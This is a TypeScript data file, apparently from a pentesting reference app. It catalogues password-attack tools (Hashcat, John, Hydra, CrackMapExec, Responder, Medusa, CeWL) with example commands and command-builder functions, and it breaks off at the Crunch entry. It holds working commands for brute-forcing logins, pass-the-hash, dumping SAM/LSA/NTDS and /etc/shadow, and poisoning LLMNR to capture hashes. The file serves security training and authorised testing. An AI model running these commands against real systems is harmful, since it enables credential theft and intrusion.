import type { Tool } from '../toolTypes';

export const passwordAttacksTools: Tool[] = [
  {
    id: 'hashcat',
    name: 'Hashcat',
    description: 'The world\'s fastest and most advanced password recovery tool. Leverages GPU acceleration to crack 300+ hash types at billions of candidates per second. Supports dictionary, brute-force, mask, hybrid, and rule-based attacks. If you have hashes, Hashcat cracks them.',
    category: 'password-attacks',
    difficulty: 'advanced',
    tags: ['password-cracking', 'gpu', 'hashes', 'fast'],
    commands: [
      { command: 'hashcat -m 0 hashes.txt rockyou.txt', description: 'Crack MD5 hashes with wordlist' },
      { command: 'hashcat -m 1000 hashes.txt rockyou.txt', description: 'Crack NTLM hashes' },
      { command: 'hashcat -m 1800 hashes.txt rockyou.txt', description: 'Crack SHA-512 crypt (Linux)' },
      { command: 'hashcat -m 22000 hashes.txt rockyou.txt', description: 'Crack WPA2 PMKID' },
      { command: 'hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a', description: 'Brute force 6 character passwords' },
      { command: 'hashcat -m 0 hashes.txt -a 6 rockyou.txt ?d?d', description: 'Hybrid: wordlist + 2 digits' },
      { command: 'hashcat -m 1000 hashes.txt -a 0 -r rules/best64.rule rockyou.txt', description: 'Apply rules to wordlist' },
      { command: 'hashcat --show hashes.txt', description: 'Show cracked passwords' },
    ],
    whenToUse: [
      'When you have password hashes to crack',
      'For password strength auditing',
      'To recover forgotten passwords',
      'When you need maximum cracking speed (GPU)',
    ],
    commonFlags: [
      { flag: '-m', description: 'Hash type — 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA512crypt, 3200=bcrypt, 13100=Kerberoast, 22000=WPA2' },
      { flag: '-a 0', description: 'Dictionary attack — try every word in a wordlist' },
      { flag: '-a 3', description: 'Mask/brute-force attack — try all combinations matching a pattern (?a?a?a?a)' },
      { flag: '-a 6', description: 'Hybrid attack — wordlist + mask appended (e.g., password + 2 digits)' },
      { flag: '-a 7', description: 'Hybrid attack — mask + wordlist (e.g., 2 digits + password)' },
      { flag: '-r', description: 'Apply rule file to mangle wordlist entries (best64.rule, dive.rule)' },
      { flag: '-w 3', description: 'Workload profile — 1=low, 2=default, 3=high, 4=nightmare (max GPU usage)' },
      { flag: '--show', description: 'Display already-cracked hashes from the potfile' },
      { flag: '-O', description: 'Enable optimized kernels — faster but limits password length to 32 chars' },
      { flag: '--force', description: 'Ignore warnings and force execution (use when GPU driver issues occur)' },
      { flag: '-o', description: 'Output cracked hashes to a file' },
    ],
    relatedTools: ['john', 'rainbowcrack', 'ophcrack'],
    installation: 'sudo apt install hashcat -y   # Pre-installed on Kali. Requires GPU drivers (NVIDIA CUDA / AMD ROCm) for full speed',
    website: 'https://hashcat.net/hashcat',
    interactiveCommands: [
      {
        name: 'Hashcat Ultimate Cracking Engine',
        description: 'Configure GPU-accelerated password cracking with full control over attack mode, hash type, wordlists, rules, and performance tuning.',
        inputs: [
          {
            id: 'hashType',
            label: 'Hash Type (-m)',
            type: 'select',
            options: ['0 (MD5)', '100 (SHA1)', '1000 (NTLM)', '1800 (SHA512crypt)', '3200 (bcrypt)', '5600 (NetNTLMv2)', '13100 (Kerberoast)', '22000 (WPA-PBKDF2)', '1400 (SHA256)', '500 (MD5crypt)'],
            defaultValue: '0 (MD5)',
            helpText: 'Use hashcat --example-hashes to identify unknown hash types'
          },
          {
            id: 'attackMode',
            label: 'Attack Mode (-a)',
            type: 'select',
            options: ['Dictionary (-a 0)', 'Combination (-a 1)', 'Brute-Force/Mask (-a 3)', 'Hybrid: Wordlist+Mask (-a 6)', 'Hybrid: Mask+Wordlist (-a 7)'],
            defaultValue: 'Dictionary (-a 0)'
          },
          {
            id: 'hashFile',
            label: 'Hash File',
            type: 'text',
            defaultValue: 'hashes.txt',
            placeholder: 'Path to file containing hashes'
          },
          {
            id: 'wordlist',
            label: 'Wordlist',
            type: 'select',
            options: ['rockyou.txt', '/usr/share/wordlists/rockyou.txt', '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt', 'Custom'],
            defaultValue: 'rockyou.txt'
          },
          {
            id: 'customWordlist',
            label: 'Custom Wordlist Path',
            type: 'text',
            defaultValue: '',
            placeholder: 'Only if Wordlist = Custom'
          },
          {
            id: 'mask',
            label: 'Mask Pattern (Brute/Hybrid)',
            type: 'text',
            defaultValue: '?a?a?a?a?a?a',
            placeholder: '?a=all ?d=digit ?l=lower ?u=upper ?s=special',
            helpText: '?a=all chars, ?d=0-9, ?l=a-z, ?u=A-Z, ?s=symbols. Example: Pass?d?d?d?d'
          },
          {
            id: 'rules',
            label: 'Rule File',
            type: 'select',
            options: ['None', 'best64.rule', 'dive.rule', 'rockyou-30000.rule', 'toggles1.rule', 'OneRuleToRuleThemAll.rule'],
            defaultValue: 'None',
            helpText: 'Rules mangle wordlist entries (capitalize, leet speak, append digits, etc.)'
          },
          {
            id: 'workload',
            label: 'Workload Profile (-w)',
            type: 'select',
            options: ['1 (Low — laptop safe)', '2 (Default)', '3 (High — desktop)', '4 (Nightmare — max GPU)'],
            defaultValue: '2 (Default)'
          },
          {
            id: 'optimized',
            label: 'Optimized Kernels (-O)',
            type: 'checkbox',
            defaultValue: 'false',
            placeholder: 'Faster but limits password to 32 chars'
          },
          {
            id: 'outputFile',
            label: 'Output Cracked to File (-o)',
            type: 'text',
            defaultValue: '',
            placeholder: 'e.g., cracked.txt (leave empty for potfile)'
          }
        ],
        generator: (inputs) => {
          const hashType = inputs.hashType.split(' ')[0];
          const attackMode = inputs.attackMode.includes('-a 0') ? '0' : inputs.attackMode.includes('-a 1') ? '1' : inputs.attackMode.includes('-a 3') ? '3' : inputs.attackMode.includes('-a 6') ? '6' : '7';
          const wordlist = inputs.wordlist === 'Custom' && inputs.customWordlist ? inputs.customWordlist : inputs.wordlist;
          const rules = inputs.rules !== 'None' ? ` -r /usr/share/hashcat/rules/${inputs.rules}` : '';
          const workload = ` -w ${inputs.workload.split(' ')[0]}`;
          const optimized = inputs.optimized === 'true' ? ' -O' : '';
          const output = inputs.outputFile ? ` -o ${inputs.outputFile}` : '';

          if (attackMode === '3') {
            return `hashcat -m ${hashType} -a 3 ${inputs.hashFile} ${inputs.mask}${workload}${optimized}${output}`;
          }
          if (attackMode === '6') {
            return `hashcat -m ${hashType} -a 6 ${inputs.hashFile} ${wordlist} ${inputs.mask}${rules}${workload}${optimized}${output}`;
          }
          if (attackMode === '7') {
            return `hashcat -m ${hashType} -a 7 ${inputs.hashFile} ${inputs.mask} ${wordlist}${workload}${optimized}${output}`;
          }
          return `hashcat -m ${hashType} -a ${attackMode} ${inputs.hashFile} ${wordlist}${rules}${workload}${optimized}${output}`;
        }
      }
    ],
  },
  {
    id: 'john',
    name: 'John the Ripper',
    description: 'Classic, versatile password cracker with CPU-focused performance. Supports 200+ hash/cipher types and excels at cracking file-encrypted passwords (ZIP, PDF, RAR, SSH keys, KeePass). Features *2john utilities that extract hashes from any file format into a crackable format.',
    category: 'password-attacks',
    difficulty: 'intermediate',
    tags: ['password-cracking', 'hashes', 'classic'],
    commands: [
      { command: 'john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt', description: 'Dictionary attack' },
      { command: 'john hashes.txt --format=NT', description: 'Specify hash format (NTLM)' },
      { command: 'john hashes.txt --incremental', description: 'Brute force attack' },
      { command: 'john hashes.txt --rules --wordlist=rockyou.txt', description: 'Apply mangling rules' },
      { command: 'john --show hashes.txt', description: 'Show cracked passwords' },
      { command: 'unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt', description: 'Crack Linux passwords' },
      { command: 'zip2john file.zip > zip.hash && john zip.hash', description: 'Crack ZIP password' },
      { command: 'pdf2john file.pdf > pdf.hash && john pdf.hash', description: 'Crack PDF password' },
    ],
    whenToUse: [
      'For general password hash cracking',
      'When Hashcat doesn\'t support a specific format',
      'For CPU-based cracking when GPU unavailable',
      'To crack file-encrypted passwords (ZIP, PDF, etc.)',
    ],
    commonFlags: [
      { flag: '--wordlist', description: 'Path to wordlist for dictionary attack' },
      { flag: '--format', description: 'Force specific hash format (NT, Raw-MD5, bcrypt, etc.)' },
      { flag: '--incremental', description: 'Pure brute-force mode — tries all character combinations' },
      { flag: '--rules', description: 'Apply word mangling rules (append numbers, capitalize, leet speak)' },
      { flag: '--show', description: 'Display already-cracked passwords' },
      { flag: '--list=formats', description: 'Show ALL supported hash formats' },
      { flag: '--fork=N', description: 'Split work across N CPU processes for parallel cracking' },
    ],
    relatedTools: ['hashcat', 'rainbowcrack'],
    installation: 'sudo apt install john -y   # Pre-installed on Kali',
    website: 'https://www.openwall.com/john',
    interactiveCommands: [
      {
        name: 'John the Ripper Crack Builder',
        description: 'Configure CPU-based password cracking with format detection, wordlists, rules, and parallel processing.',
        inputs: [
          {
            id: 'mode',
            label: 'Attack Mode',
            type: 'select',
            options: ['Dictionary (--wordlist)', 'Incremental (Brute-Force)', 'Single Crack', 'Show Cracked (--show)', 'Extract Hash (*2john)'],
            defaultValue: 'Dictionary (--wordlist)'
          },
          {
            id: 'hashFile',
            label: 'Hash File',
            type: 'text',
            defaultValue: 'hashes.txt',
            placeholder: 'e.g., hashes.txt or combined.txt'
          },
          {
            id: 'format',
            label: 'Hash Format (--format)',
            type: 'select',
            options: ['Auto-Detect', 'NT (NTLM)', 'Raw-MD5', 'Raw-SHA1', 'Raw-SHA256', 'bcrypt', 'sha512crypt', 'PKZIP', 'SSH', 'KeePass', 'PDF'],
            defaultValue: 'Auto-Detect',
            helpText: 'Auto-detect works most of the time. Specify format if John guesses wrong.'
          },
          {
            id: 'wordlist',
            label: 'Wordlist',
            type: 'select',
            options: ['/usr/share/wordlists/rockyou.txt', '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt', 'Custom'],
            defaultValue: '/usr/share/wordlists/rockyou.txt'
          },
          {
            id: 'customWordlist',
            label: 'Custom Wordlist Path',
            type: 'text',
            defaultValue: '',
            placeholder: 'Only if Wordlist = Custom'
          },
          {
            id: 'rules',
            label: 'Enable Rules (--rules)',
            type: 'checkbox',
            defaultValue: 'false',
            placeholder: 'Apply word mangling rules',
            helpText: 'Append numbers, capitalize, leet speak, reverse — greatly increases coverage'
          },
          {
            id: 'fork',
            label: 'Parallel Processes (--fork)',
            type: 'select',
            options: ['1 (Single)', '2', '4', '8'],
            defaultValue: '1 (Single)',
            helpText: 'Split work across multiple CPU cores'
          },
          {
            id: 'extractType',
            label: 'File Type (Extract Mode)',
            type: 'select',
            options: ['zip2john', 'pdf2john', 'rar2john', 'ssh2john', 'keepass2john', 'office2john'],
            defaultValue: 'zip2john',
            helpText: 'Only used when Attack Mode = Extract Hash'
          },
          {
            id: 'extractFile',
            label: 'File to Extract From',
            type: 'text',
            defaultValue: '',
            placeholder: 'e.g., secret.zip, doc.pdf, id_rsa'
          }
        ],
        generator: (inputs) => {
          const format = inputs.format !== 'Auto-Detect' ? ` --format=${inputs.format}` : '';
          const wordlist = inputs.wordlist === 'Custom' && inputs.customWordlist ? inputs.customWordlist : inputs.wordlist;
          const rules = inputs.rules === 'true' ? ' --rules' : '';
          const fork = inputs.fork !== '1 (Single)' ? ` --fork=${inputs.fork}` : '';

          if (inputs.mode === 'Show Cracked (--show)') {
            return `john --show${format} ${inputs.hashFile}`;
          }
          if (inputs.mode === 'Extract Hash (*2john)') {
            return `${inputs.extractType} ${inputs.extractFile || 'file'} > extracted.hash && john extracted.hash --wordlist=${wordlist}${rules}`;
          }
          if (inputs.mode === 'Incremental (Brute-Force)') {
            return `john --incremental${format}${fork} ${inputs.hashFile}`;
          }
          if (inputs.mode === 'Single Crack') {
            return `john --single${format}${fork} ${inputs.hashFile}`;
          }
          return `john --wordlist=${wordlist}${format}${rules}${fork} ${inputs.hashFile}`;
        }
      }
    ]
  },
  {
    id: 'hydra',
    name: 'Hydra',
    description: 'The most popular online password brute-forcer. Attacks login services over the network in real-time across 50+ protocols including SSH, FTP, HTTP, SMB, RDP, MySQL, VNC, LDAP, and more. Fast, parallelized, and supports custom HTTP form attacks.',
    category: 'password-attacks',
    difficulty: 'beginner',
    tags: ['brute-force', 'network', 'login', 'online'],
    commands: [
      { command: 'hydra -l admin -P rockyou.txt ssh://192.168.1.100', description: 'SSH brute force' },
      { command: 'hydra -L users.txt -P passwords.txt ftp://192.168.1.100', description: 'FTP with user and pass lists' },
      { command: 'hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', description: 'HTTP form brute force' },
      { command: 'hydra -l admin -P rockyou.txt 192.168.1.100 smb', description: 'SMB brute force' },
      { command: 'hydra -l admin -P rockyou.txt 192.168.1.100 rdp', description: 'RDP brute force' },
      { command: 'hydra -l admin -P rockyou.txt 192.168.1.100 mysql', description: 'MySQL brute force' },
      { command: 'hydra -t 4 -l admin -P rockyou.txt 192.168.1.100 ssh', description: 'Limit to 4 parallel tasks' },
    ],
    whenToUse: [
      'To test password strength on network services',
      'For authorized penetration testing of login systems',
      'When you need to brute-force online services',
      'To check for weak/default credentials',
    ],
    commonFlags: [
      { flag: '-l / -L', description: 'Single username / Username list file' },
      { flag: '-p / -P', description: 'Single password / Password list file' },
      { flag: '-t', description: 'Number of parallel tasks/threads (default: 16, lower for slow services)' },
      { flag: '-f', description: 'Stop after first valid credential found' },
      { flag: '-vV', description: 'Verbose mode — show each login attempt in real-time' },
      { flag: '-o', description: 'Write found credentials to output file' },
      { flag: '-s', description: 'Custom port number for the service' },
      { flag: '-e nsr', description: 'Try null password (n), login as password (s), reversed login (r)' },
    ],
    relatedTools: ['medusa', 'ncrack', 'patator'],
    installation: 'sudo apt install hydra -y   # Pre-installed on Kali',
    website: 'https://github.com/vanhauser-thc/thc-hydra',
    interactiveCommands: [
      {
        name: 'Hydra Brute Force Configurator',
        description: 'Build network login brute-force attacks across 50+ protocols with threading, evasion, and credential controls.',
        inputs: [
          {
            id: 'service',
            label: 'Target Service',
            type: 'select',
            options: ['ssh', 'ftp', 'rdp', 'smb', 'mysql', 'mssql', 'vnc', 'telnet', 'pop3', 'imap', 'smtp', 'http-post-form', 'http-get', 'snmp', 'ldap2'],
            defaultValue: 'ssh'
          },
          {
            id: 'target',
            label: 'Target IP / Host',
            type: 'text',
            defaultValue: '192.168.1.100',
            placeholder: 'e.g., 10.10.10.5 or target.com'
          },
          {
            id: 'port',
            label: 'Custom Port (-s)',
            type: 'text',
            defaultValue: '',
            placeholder: 'Leave empty for default port',
            helpText: 'Only needed if the service runs on a non-standard port'
          },
          {
            id: 'userMode',
            label: 'Username Mode',
            type: 'select',
            options: ['Single User (-l)', 'User List (-L)'],
            defaultValue: 'Single User (-l)'
          },
          {
            id: 'username',
            label: 'Username / User File',
            type: 'text',
            defaultValue: 'admin',
            placeholder: 'e.g., admin or /path/to/users.txt'
          },
          {
            id: 'passwordList',
            label: 'Password List (-P)',
            type: 'text',
            defaultValue: '/usr/share/wordlists/rockyou.txt',
            placeholder: 'Path to password wordlist'
          },
          {
            id: 'threads',
            label: 'Threads (-t)',
            type: 'select',
            options: ['4 (Safe — SSH/RDP)', '8', '16 (Default)', '32 (Aggressive)', '64 (Max)'],
            defaultValue: '16 (Default)',
            helpText: 'Lower threads for SSH (4) to avoid lockouts. Higher for HTTP forms.'
          },
          {
            id: 'stopOnFirst',
            label: 'Stop After First Hit (-f)',
            type: 'checkbox',
            defaultValue: 'true',
            placeholder: 'Stop on first valid credential'
          },
          {
            id: 'verbose',
            label: 'Verbose Output (-vV)',
            type: 'checkbox',
            defaultValue: 'false',
            placeholder: 'Show every login attempt'
          },
          {
            id: 'extraChecks',
            label: 'Extra Credential Checks (-e)',
            type: 'select',
            options: ['None', 'nsr (null+same+reverse)', 'ns (null+same)', 'n (null only)'],
            defaultValue: 'None',
            helpText: 'n=null password, s=login as password, r=reversed login'
          }
        ],
        generator: (inputs) => {
          const userFlag = inputs.userMode.includes('-l') ? '-l' : '-L';
          const port = inputs.port ? ` -s ${inputs.port}` : '';
          const threads = ` -t ${inputs.threads.split(' ')[0]}`;
          const stop = inputs.stopOnFirst === 'true' ? ' -f' : '';
          const verbose = inputs.verbose === 'true' ? ' -vV' : '';
          const extra = inputs.extraChecks !== 'None' ? ` -e ${inputs.extraChecks.split(' ')[0]}` : '';

          return `hydra ${userFlag} ${inputs.username} -P ${inputs.passwordList}${threads}${stop}${verbose}${extra}${port} ${inputs.target} ${inputs.service}`;
        }
      }
    ]
  },
  {
    id: 'crackmapexec',
    name: 'CrackMapExec (CME)',
    description: 'Swiss army knife for pentesting Windows/Active Directory networks. Combines credential testing, share enumeration, command execution, SAM dumping, and password spraying into a single tool. Tests credentials across entire subnets in seconds — essential for AD engagements.',
    category: 'password-attacks',
    difficulty: 'intermediate',
    tags: ['active-directory', 'smb', 'windows', 'pentest'],
    commands: [
      { command: 'crackmapexec smb 192.168.1.0/24', description: 'Enumerate SMB on subnet' },
      { command: 'crackmapexec smb 192.168.1.100 -u admin -p \'Password123\'', description: 'Test credentials' },
      { command: 'crackmapexec smb 192.168.1.100 -u admin -H NTLM_HASH', description: 'Pass-the-hash attack' },
      { command: 'crackmapexec smb 192.168.1.0/24 -u admin -p pass --shares', description: 'Enumerate shares' },
      { command: 'crackmapexec smb 192.168.1.100 -u admin -p pass --sam', description: 'Dump SAM database' },
      { command: 'crackmapexec smb 192.168.1.100 -u admin -p pass -x "whoami"', description: 'Execute command' },
      { command: 'crackmapexec winrm 192.168.1.100 -u admin -p pass', description: 'WinRM access' },
    ],
    whenToUse: [
      'For Active Directory penetration testing',
      'To enumerate and exploit SMB shares',
      'For pass-the-hash attacks',
      'To execute commands on multiple Windows hosts',
    ],
    commonFlags: [
      { flag: '-u', description: 'Username for authentication' },
      { flag: '-p', description: 'Password for authentication' },
      { flag: '-H', description: 'NTLM hash for Pass-the-Hash attack' },
      { flag: '--shares', description: 'Enumerate accessible SMB shares' },
      { flag: '--sam', description: 'Dump SAM database (local password hashes)' },
      { flag: '--lsa', description: 'Dump LSA secrets (cached domain credentials)' },
      { flag: '-x', description: 'Execute a command on the target via SMB' },
      { flag: '--pass-pol', description: 'Get domain password policy (lockout threshold, complexity)' },
      { flag: '--users', description: 'Enumerate domain users' },
    ],
    relatedTools: ['impacket', 'metasploit', 'psexec', 'netexec'],
    installation: 'pip install crackmapexec   # or: sudo apt install crackmapexec -y',
    website: 'https://github.com/byt3bl33d3r/CrackMapExec',
    interactiveCommands: [
      {
        name: 'CrackMapExec AD Attack Builder',
        description: 'Configure credential testing, share enumeration, hash dumping, and command execution across Active Directory networks.',
        inputs: [
          {
            id: 'protocol',
            label: 'Protocol',
            type: 'select',
            options: ['smb', 'winrm', 'ldap', 'mssql', 'ssh', 'rdp'],
            defaultValue: 'smb'
          },
          {
            id: 'target',
            label: 'Target (IP / CIDR / File)',
            type: 'text',
            defaultValue: '192.168.1.0/24',
            placeholder: 'e.g., 10.10.10.5 or 192.168.1.0/24'
          },
          {
            id: 'authType',
            label: 'Authentication Type',
            type: 'select',
            options: ['Password (-p)', 'NTLM Hash (-H)', 'No Auth (null session)'],
            defaultValue: 'Password (-p)'
          },
          {
            id: 'username',
            label: 'Username (-u)',
            type: 'text',
            defaultValue: 'administrator',
            placeholder: 'Domain user or local admin'
          },
          {
            id: 'credential',
            label: 'Password / Hash',
            type: 'text',
            defaultValue: 'Password123',
            placeholder: 'Password or NTLM hash (aad3b435...)'
          },
          {
            id: 'domain',
            label: 'Domain (-d)',
            type: 'text',
            defaultValue: '',
            placeholder: 'e.g., CORP.LOCAL (leave empty for local)'
          },
          {
            id: 'action',
            label: 'Post-Auth Action',
            type: 'select',
            options: ['Enumerate Only', '--shares', '--users', '--groups', '--sam', '--lsa', '--ntds', '--pass-pol', '-x (Execute CMD)', '--spider_plus'],
            defaultValue: 'Enumerate Only'
          },
          {
            id: 'command',
            label: 'Command to Execute',
            type: 'text',
            defaultValue: 'whoami',
            placeholder: 'Only used with -x action',
            helpText: 'Command runs via wmiexec. Requires admin rights on target.'
          }
        ],
        generator: (inputs) => {
          const authFlag = inputs.authType.includes('-H') ? '-H' : inputs.authType.includes('-p') ? '-p' : '';
          const cred = authFlag ? ` ${authFlag} '${inputs.credential}'` : '';
          const user = authFlag ? ` -u ${inputs.username}` : '';
          const domain = inputs.domain ? ` -d ${inputs.domain}` : '';
          let action = '';
          if (inputs.action === '-x (Execute CMD)') action = ` -x '${inputs.command}'`;
          else if (inputs.action !== 'Enumerate Only') action = ` ${inputs.action}`;

          return `crackmapexec ${inputs.protocol} ${inputs.target}${user}${cred}${domain}${action}`;
        }
      }
    ]
  },
  {
    id: 'responder',
    name: 'Responder',
    description: 'LLMNR/NBT-NS/MDNS poisoner and NTLM hash capture tool. Listens on the network for failed name resolution requests and responds with your IP, tricking victims into sending their NTLM authentication hashes to you. Works passively — just start it and wait for hashes to roll in.',
    category: 'password-attacks',
    difficulty: 'intermediate',
    tags: ['llmnr', 'nbns', 'hash-capture', 'network'],
    commands: [
      { command: 'responder -I eth0 -rdwv', description: 'Start Responder in aggressive mode' },
      { command: 'responder -I eth0 -A', description: 'Analyze mode (passive only)' },
      { command: 'responder -I eth0 -wrfv', description: 'Enable WPAD and Force NTLM auth' },
    ],
    whenToUse: [
      'On internal networks to capture NTLM hashes',
      'When LLMNR/NBT-NS is enabled (common)',
      'For SMB relay attacks preparation',
      'To gather credentials without exploits',
    ],
    commonFlags: [
      { flag: '-I', description: 'Network interface to listen on (e.g., eth0, wlan0)' },
      { flag: '-r', description: 'Enable answers for netbios wredir suffix queries' },
      { flag: '-d', description: 'Enable answers for netbios domain suffix queries' },
      { flag: '-w', description: 'Start the WPAD rogue proxy server (captures HTTP NTLM auth)' },
      { flag: '-v', description: 'Verbose mode — increase output detail' },
      { flag: '-A', description: 'Analyze mode — listen only, do not respond/poison (safe recon)' },
      { flag: '-f', description: 'Fingerprint the host OS after poisoning' },
    ],
    relatedTools: ['impacket', 'ntlmrelayx', 'mitm6'],
    installation: 'sudo apt install responder -y   # Pre-installed on Kali',
    website: 'https://github.com/lgandx/Responder',
    interactiveCommands: [
      {
        name: 'Responder Hash Capture Builder',
        description: 'Configure LLMNR/NBT-NS/MDNS poisoning to capture NTLM hashes on internal networks.',
        inputs: [
          {
            id: 'interface',
            label: 'Network Interface (-I)',
            type: 'text',
            defaultValue: 'eth0',
            placeholder: 'e.g., eth0, wlan0, tun0'
          },
          {
            id: 'mode',
            label: 'Mode',
            type: 'select',
            options: ['Poisoning (Active)', 'Analyze Only (-A)'],
            defaultValue: 'Poisoning (Active)',
            helpText: 'Analyze mode only listens — no poisoning. Safe for initial recon.'
          },
          {
            id: 'wpad',
            label: 'WPAD Proxy (-w)',
            type: 'checkbox',
            defaultValue: 'false',
            placeholder: 'Start rogue WPAD proxy',
            helpText: 'Captures HTTP NTLM auth from browsers checking for proxy configs'
          },
          {
            id: 'rdwr',
            label: 'NetBIOS Flags (-r -d)',
            type: 'checkbox',
            defaultValue: 'true',
            placeholder: 'Answer wredir + domain queries'
          },
          {
            id: 'fingerprint',
            label: 'OS Fingerprint (-f)',
            type: 'checkbox',
            defaultValue: 'false',
            placeholder: 'Fingerprint host OS after poisoning'
          },
          {
            id: 'verbose',
            label: 'Verbose (-v)',
            type: 'checkbox',
            defaultValue: 'true',
            placeholder: 'Show detailed output'
          }
        ],
        generator: (inputs) => {
          const analyze = inputs.mode.includes('-A') ? ' -A' : '';
          const wpad = inputs.wpad === 'true' ? ' -w' : '';
          const rdwr = inputs.rdwr === 'true' ? ' -r -d' : '';
          const fp = inputs.fingerprint === 'true' ? ' -f' : '';
          const verbose = inputs.verbose === 'true' ? ' -v' : '';

          return `responder -I ${inputs.interface}${analyze}${wpad}${rdwr}${fp}${verbose}`;
        }
      }
    ]
  },
  {
    id: 'medusa',
    name: 'Medusa',
    description: 'Massively parallel network login brute-forcer with modular architecture. Supports FTP, HTTP, IMAP, MS-SQL, MySQL, POP3, PostgreSQL, SMB, SMTP, SSH, Telnet, VNC, and more. Designed for speed when attacking large numbers of hosts simultaneously.',
    category: 'password-attacks',
    difficulty: 'beginner',
    tags: ['brute-force', 'network', 'login', 'fast'],
    commands: [
      { command: 'medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ssh', description: 'SSH brute force' },
      { command: 'medusa -H targets.txt -U users.txt -P rockyou.txt -M smtp', description: 'Multiple targets and protocols' },
      { command: 'medusa -d', description: 'List all supported protocol modules' },
    ],
    whenToUse: [
      'As an alternative to Hydra when a different threading model is needed',
      'For highly parallel brute forcing across massive IP lists',
      'When specifically targeting AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, etc.',
    ],
    commonFlags: [
      { flag: '-h', description: 'Target hostname or IP' },
      { flag: '-H', description: 'File containing target hosts (one per line)' },
      { flag: '-u / -U', description: 'Single username / Username file' },
      { flag: '-P', description: 'Password file' },
      { flag: '-M', description: 'Module/protocol name (ssh, ftp, http, etc.)' },
      { flag: '-t', description: 'Number of login attempts per host in parallel' },
      { flag: '-d', description: 'List all available modules' },
    ],
    relatedTools: ['hydra', 'ncrack'],
    installation: 'sudo apt install medusa -y',
    website: 'http://foofus.net/goons/jmk/medusa/medusa.html',
    interactiveCommands: [
      {
        name: 'Medusa Parallel Brute-Forcer',
        description: 'Configure high-speed, parallel login brute-forcing across various network protocols.',
        inputs: [
          { id: 'targetMode', label: 'Target Mode', type: 'select', options: ['Single Host (-h)', 'Hosts File (-H)'], defaultValue: 'Single Host (-h)' },
          { id: 'target', label: 'Target / File', type: 'text', defaultValue: '192.168.1.100', placeholder: 'IP or path to hosts.txt' },
          { id: 'module', label: 'Module (-M)', type: 'select', options: ['ssh', 'ftp', 'http', 'mssql', 'mysql', 'smbnt', 'telnet', 'vnc'], defaultValue: 'ssh' },
          { id: 'userMode', label: 'User Mode', type: 'select', options: ['Single User (-u)', 'User File (-U)'], defaultValue: 'Single User (-u)' },
          { id: 'username', label: 'Username / File', type: 'text', defaultValue: 'admin', placeholder: 'admin or users.txt' },
          { id: 'passwordFile', label: 'Password File (-P)', type: 'text', defaultValue: '/usr/share/wordlists/rockyou.txt', placeholder: 'Path to wordlist' },
          { id: 'threads', label: 'Threads (-t)', type: 'text', defaultValue: '16', placeholder: 'Connections per host' }
        ],
        generator: (inputs) => {
          let cmd = 'medusa';
          
          const targetFlag = inputs.targetMode === 'Single Host (-h)' ? '-h' : '-H';
          cmd += ` ${targetFlag} ${inputs.target}`;
          
          const userFlag = inputs.userMode === 'Single User (-u)' ? '-u' : '-U';
          cmd += ` ${userFlag} ${inputs.username}`;
          
          cmd += ` -P ${inputs.passwordFile} -M ${inputs.module}`;
          
          if (inputs.threads && inputs.threads !== '16') {
            cmd += ` -t ${inputs.threads}`;
          }
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'cewl',
    name: 'CeWL',
    description: 'Custom wordlist generator that spiders a target website and extracts unique words to build organization-specific password dictionaries. When rockyou.txt fails, CeWL creates wordlists from the target\'s own website content — company names, product names, and jargon that employees use as passwords.',
    category: 'password-attacks',
    difficulty: 'beginner',
    tags: ['wordlist', 'generator', 'spidering', 'custom'],
    commands: [
      { command: 'cewl http://example.com -w custom_list.txt', description: 'Basic site spider and word extraction' },
      { command: 'cewl http://example.com -d 2 -m 5 -w list.txt', description: 'Spider depth 2, minimum word length 5' },
      { command: 'cewl http://example.com -e --email_file emails.txt', description: 'Extract email addresses while spidering' },
    ],
    whenToUse: [
      'When general dictionaries (like rockyou) fail',
      'To create highly customized, specific wordlists targeting a particular organization',
      'When targeting corporate portals that enforce password policies incorporating company names',
    ],
    commonFlags: [
      { flag: '-w', description: 'Output wordlist file' },
      { flag: '-d', description: 'Spider depth (how many links deep to follow)' },
      { flag: '-m', description: 'Minimum word length to include' },
      { flag: '-e', description: 'Also extract email addresses found while spidering' },
      { flag: '--email_file', description: 'Separate file to save extracted emails' },
      { flag: '-c', description: 'Show word count for each word found' },
      { flag: '--lowercase', description: 'Force all words to lowercase' },
    ],
    relatedTools: ['crunch', 'mentalist', 'cupp'],
    installation: 'sudo apt install cewl -y   # Pre-installed on Kali',
    website: 'https://github.com/digininja/CeWL',
    interactiveCommands: [
      {
        name: 'CeWL Wordlist Spider',
        description: 'Extract highly targeted, custom wordlists by spidering an organization\'s website.',
        inputs: [
          { id: 'url', label: 'Target URL', type: 'text', defaultValue: 'http://example.com', placeholder: 'Must include http(s)://' },
          { id: 'depth', label: 'Spider Depth (-d)', type: 'select', options: ['1', '2', '3', '5'], defaultValue: '2' },
          { id: 'minLength', label: 'Min Word Length (-m)', type: 'text', defaultValue: '5', placeholder: 'Ignore short words' },
          { id: 'lowercase', label: 'Force Lowercase', type: 'checkbox', defaultValue: 'true', placeholder: '--lowercase' },
          { id: 'extractEmails', label: 'Extract Emails (-e)', type: 'checkbox', defaultValue: 'false', placeholder: 'Find email addresses' },
          { id: 'emailFile', label: 'Email Output File', type: 'text', defaultValue: 'emails.txt', placeholder: 'Requires Extract Emails' },
          { id: 'output', label: 'Wordlist Output (-w)', type: 'text', defaultValue: 'custom_wordlist.txt', placeholder: 'Filename to save words' }
        ],
        generator: (inputs) => {
          let cmd = `cewl ${inputs.url}`;
          
          if (inputs.depth && inputs.depth !== '2') cmd += ` -d ${inputs.depth}`;
          if (inputs.minLength && inputs.minLength !== '5') cmd += ` -m ${inputs.minLength}`;
          if (inputs.lowercase === 'true') cmd += ' --lowercase';
          
          if (inputs.extractEmails === 'true') {
             cmd += ' -e';
             if (inputs.emailFile) cmd += ` --email_file ${inputs.emailFile}`;
          }
          
          if (inputs.output) cmd += ` -w ${inputs.output}`;
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'crunch',
    name: 'Crunch',
